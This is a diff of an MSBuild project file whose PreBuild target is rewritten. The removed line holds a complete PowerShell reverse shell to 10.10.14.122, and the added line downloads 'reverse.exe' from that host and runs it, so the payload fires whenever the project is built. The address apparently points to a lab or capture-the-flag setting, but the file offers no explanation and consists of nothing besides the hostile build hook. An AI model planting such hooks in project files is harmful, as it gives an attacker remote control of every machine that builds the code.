@@ -9,7 +9,7 @@
   </PropertyGroup>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.14.122',1560);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%25{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;" />
+    <Exec Command="powershell -ep bypass &quot;iwr -uri http://10.10.14.122:8081/reverse.exe -OutFile c:\windows\temp ;Start-Process -FilePath c:\windows\temp\reverse.exe&quot;" />
   </Target>
 
 </Project>
